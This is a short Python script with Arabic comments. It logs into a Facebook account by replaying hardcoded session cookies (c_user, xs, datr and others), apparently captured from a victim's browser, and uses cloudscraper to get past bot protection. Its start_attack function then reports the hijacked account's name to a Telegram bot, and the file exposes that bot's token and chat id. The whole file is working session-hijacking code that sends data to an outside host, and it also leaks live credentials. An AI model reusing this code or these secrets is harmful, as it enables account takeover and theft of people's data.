import cloudscraper
import requests

token = "7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks"
chat_id = "5042495708"

# الكوكيز الطازة من صورك
fb_cookies = {
    'sb': 'iWplaTgxXWaKpJpcZOMr2nJZ',
    'datr': 'iGplaV28PgweKRFA2B3ALpcC',
    'c_user': '100003550913323',
    'xs': '31%3AyHNizqiAxU5oow%3A2%3A1768254323%3A-1%3A-1',
    'fr': '0ZAmSGvgnip1quTXs.AWdgsx0QhggrZq94vKKRCo5pO3T-0qg6rsrDmYRSvWA3m88_GbY.BpZWqJ..AAA.0.0.Bpas6R.AWfooahctK83Y1jXwGS-AemJPDI',
    'locale': 'ar_AR'
}

def start_attack():
    print("🚀 جاري الدخول بالكوكيز الجديدة...")
    scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'desktop': False})
    
    try:
        url = "https://mbasic.facebook.com/profile.php"
        res = scraper.get(url, cookies=fb_cookies)
        
        # التأكد من نجاح الدخول
        if "Logout" in res.text or "تسجيل الخروج" in res.text or "100003550913323" in res.text:
            try:
                name = res.text.split('<title>')[1].split('</title>')[0]
            except:
                name = "فادي (الحساب نشط)"
            
            print(f"✅ تم الدخول! الاسم: {name}")
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": chat_id, "text": f"💙 وحش البرمجة.. فيسبوك شغال!\n👤 الحساب: {name}"})
        else:
            print("❌ الكوكيز شكلها طفيت بسرعة! جرب Kiwi من جديد.")
            
    except Exception as e:
        print(f"🚫 وقع خطأ: {str(e)}")

if __name__ == "__main__":
    start_attack()
